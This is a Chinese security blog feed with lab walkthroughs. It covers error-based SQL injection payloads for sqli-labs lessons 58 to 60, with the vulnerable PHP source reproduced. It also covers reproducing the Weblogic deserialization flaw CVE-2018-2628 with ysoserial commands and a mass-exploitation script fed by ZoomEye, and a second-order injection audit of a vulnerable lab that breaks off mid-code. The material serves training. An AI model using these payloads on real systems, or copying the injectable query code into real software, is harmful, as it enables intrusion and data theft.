&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 5;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;= ($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);                $pass = array_reverse($unames);                echo &#39;Your Login name : &#39;. $unames[$row[&#39;id&#39;]];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password : &#39; .$pass[$row[&#39;id&#39;]];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-58.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求如是循环，这里不在重复，只是次数减少成了5次，无法正常回显结果，但是代码输出了mysql报错可以用报错注入根据代码给出payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-58/index.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20--+http://127.0.0.1/sqli-labs-master/Less-58/index.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22),0x7e),1)%20--+http://127.0.0.1/sqli-labs-master/Less-58/index.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20`2`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20zejpphddnv)a%20limit%201,1),0x7e),1)%20--+</code></pre><p><img src="https://s2.ax1x.com/2019/02/17/ksz0MV.png" alt="ksz0MV.png"></p><p><b>59关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-59:Challenge-6&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 5;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;= ($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);                $pass = array_reverse($unames);                echo &#39;Your Login name : &#39;. $unames[$row[&#39;id&#39;]];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password : &#39; .$pass[$row[&#39;id&#39;]];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-59.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求如是循环非我不可，这次可尝试注入的次数为6次，根据代码给出payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)http://127.0.0.1/sqli-labs-master/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22),0x7e),1)</code></pre><p>mysql&gt; select <em> from n7geazs8vw where id=1 and updatexml(1,concat(0x7e,(select <code>3</code> from (select 1,2,3,4 union select </em> from n7geazs8vw)a limit 1,1),0x7e),1);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~hjYL3TyRcHgWxt35BVu4srby~’</p><p><b>60关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-60:Challenge-7&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 5;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;= ($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                $id = &#39;(&quot;&#39;.$id.&#39;&quot;)&#39;;            // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);                $pass = array_reverse($unames);                echo &#39;Your Login name : &#39;. $unames[$row[&#39;id&#39;]];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password : &#39; .$pass[$row[&#39;id&#39;]];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-60.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>滴滴滴，这作者又玩重复的招数<br><img src="https://s2.ax1x.com/2019/02/17/kypnjP.png" alt="kypnjP.png"></p><p>根据代码给出payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-60/?id=1%27%22)%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20--+http://127.0.0.1/sqli-labs-master/Less-60/?id=1%27%22)%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22),0x7e),1)%20--+http://127.0.0.1/sqli-labs-master/Less-60/?id=1%27%22)%20and%20updatexml(1,concat(0x7e,((select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20glepzxoblp)a%20limit%201,1)),0x7e),1)%20--+</code></pre><p><img src="https://s2.ax1x.com/2019/02/17/kypdBT.png" alt=""></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Weblogic deserialization vulnerability recurrence (CVE-2018-2628)</title>
      <link href="/posts/5a7054a8.html"/>
      <url>/posts/5a7054a8.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>复现CVE-2018-2628的反序列化漏洞，正好还欠慕慕一个对应的利用脚本。随便就一起搞了，搭建这个靶场可真的是耗费时间= =</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20180705/7ce9bee1c06544e8992b78c0a1b29dff.jpg" alt="7ce9bee1c06544e8992b78c0a1b29dff.jpg"></p><p><b>BGM 方圆几里:</b><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27955658&auto=1&height=66"></iframe></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p>首先去vulhub下好对应的项目，进入对应的文件夹，执行：</p><pre><code>docker-compose up -d</code></pre><p>搭建好环境后，访问：127.0.0.1:7001<br>出现以下：<br><img src="https://s2.ax1x.com/2019/02/16/ksQKVH.png" alt="ksQKVH.png"></p><p><b>漏洞介绍</b></p><blockquote><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p></blockquote><p><b>漏洞复现</b><br>下载对应的利用工具：</p><pre><code>wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jarcopy里面的利用代码https://www.exploit-db.com/exploits/44553</code></pre><p>利用：<br>启动一个JRMP Server：</p><pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]listen port=监听的端口command=你要执行的命令例子：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1001 CommonsCollections1 &#39;touch /haq520&#39;</code></pre><p><img src="https://s2.ax1x.com/2019/02/16/kstj2j.png" alt="kstj2j.png"></p><p>发送exploit</p><pre><code>python exp.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 127.0.0.1 1099 JRMPClient</code></pre><p><img src="https://s2.ax1x.com/2019/02/16/ksNMdK.md.png" alt=""></p><p>结果：<br><img src="https://s2.ax1x.com/2019/02/16/ksNaeP.png" alt="ksNaeP.png"> </p><p><b>实战</b><br>上面说了欠慕慕一个脚本，这里下午写完。放入了仓库<br><a href="https://github.com/422926799/python/tree/master/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">python/weblogic反序列化批量利用 at master · 422926799/python · GitHub</a></p><p>说明：<br>weblogic反序列化批量利用，可通过网页关键字判断是否weblogic服务，批量检测或单个检测，判断7001端口是否开放,可从zoomeye抓取IP，请自行配置config文件夹里面的search.ini，填写zoomeye的user和pwd。</p><p>测试结果：<br><img src="https://s2.ax1x.com/2019/02/16/ksNszj.png" alt="ksNszj.png"></p><p><img src="https://s2.ax1x.com/2019/02/16/ksNTSJ.png" alt="ksNTSJ.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>V shot field user login second injection</title>
      <link href="/posts/8c872ea6.html"/>
      <url>/posts/8c872ea6.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>干完事情去审计靶场里的代码，发现了一处二次注入。作者真的是懒！</p><p><img src="https://p1.pstatp.com/large/pgc-image/1541084522477aa34df26b3?/1.jpg" alt="1.jpg"></p><p><b>BGM 哑巴:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=557583281&auto=1&height=66"></iframe><br></b></p><h2 id="V靶场用户登录处二次注入"><a href="#V靶场用户登录处二次注入" class="headerlink" title="V靶场用户登录处二次注入"></a>V靶场用户登录处二次注入</h2><hr><p>先看user文件夹里面的<br>regCheck.php</p><pre><code class="php">&lt;?phpinclude_once(&#39;../sys/config.php&#39;);if (isset($_POST[&#39;submit&#39;]) &amp;&amp; !empty($_POST[&#39;user&#39;]) &amp;&amp; !empty($_POST[&#39;passwd&#39;])) {    if (strlen($_POST[&#39;user&#39;])&gt;16) {        $_SESSION[&#39;error_info&#39;] = &#39;用户名過長（用戶名長度&lt;=16）&#39;;        header(&#39;Location: reg.php&#39;);        exit;    }    //过滤输入变量    $clean_name = clean_input($_POST[&#39;user&#39;]);    $clean_pass = clean_input($_POST[&#39;passwd&#39;]);    $avatar = &#39;../images/default.jpg&#39;;    //判断用户名已是否存在    $query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_name&#39;&quot;;    $data = mysql_query($query, $conn);    if (mysql_num_rows($data) == 1) {        $_SESSION[&#39;error_info&#39;] = &#39;用户名已存在&#39;;        header(&#39;Location: reg.php&#39;);    }    //添加用户    else {        $_SESSION[&#39;username&#39;] = $clean_name;        $_SESSION[&#39;avatar&#39;] = $avatar;        $date = date(&#39;Y-m-d&#39;);        $query = &quot;INSERT INTO users(user_name,user_pass,user_avatar,join_date) VALUES (&#39;$clean_name&#39;,SHA(&#39;$clean_pass&#39;),&#39;$avatar&#39;,&#39;$date&#39;)&quot;;        mysql_query($query, $conn) or die(&quot;Error!!&quot;);        header(&#39;Location: user.php&#39;);    }    mysql_close($conn);}else {    not_find($_SERVER[&#39;PHP_SELF&#39;]);}?&gt;</code></pre><p>logCheck.php</p><pre><code class="php">&lt;?phpinclude_once(&#39;../sys/config.php&#39;);if (isset($_POST[&#39;submit&#39;]) &amp;&amp; !empty($_POST[&#39;user&#39;]) &amp;&amp; !empty($_POST[&#39;pass&#39;])) {    $clean_name = clean_input($_POST[&#39;user&#39;]);    $clean_pass = clean_input($_POST[&#39;pass&#39;]);    $query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_name&#39; AND user_pass = SHA(&#39;$clean_pass&#39;)&quot;;    $data = mysql_query($query, $conn) or die(&#39;Error!!&#39;);    if (mysql_num_rows($data) == 1) {        $row = mysql_fetch_array($data);        $_SESSION[&#39;username&#39;] = $row[&#39;user_name&#39;];        $_SESSION[&#39;avatar&#39;] = $row[&#39;user_avatar&#39;];        $ip = sqlwaf(get_client_ip());        $query = &quot;UPDATE users SET login_ip = &#39;$ip&#39; WHERE user_id = &#39;$row[user_id]&#39;&quot;;        mysql_query($query, $conn) or die(&quot;updata error!&quot;);        header(&#39;Location: user.php&#39;);        }    else {        $query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_name&#39; AND user_pass = SHA(&#39;$clean_pass&#39;)&quot;;        $_SESSION[&#39;error_info&#39;] = &#39;用户名或密码错误,查询的语句是：&#39;.$query;        header(&#39;Location: login.php&#39;);    }    mysql_close($conn);}else {    not_find($_SERVER[&#39;PHP_SELF&#39;]);}?&gt;</code></pre><p>user.php</p><pre><code class="php">&lt;?phpinclude_once &#39;../sys/config.php&#39;;if ( isset( $_SESSION[&#39;username&#39;] ) ) {    include_once &#39;../header.php&#39;;    if ( !isset( $SESSION[&#39;user_id&#39;] ) ) {        $query = &quot;SELECT * FROM users WHERE user_name = &#39;{$_SESSION[&#39;username&#39;]}&#39;&quot;; /*没对$_session[&#39;username&#39;]做任何过滤，存在注入*/        echo 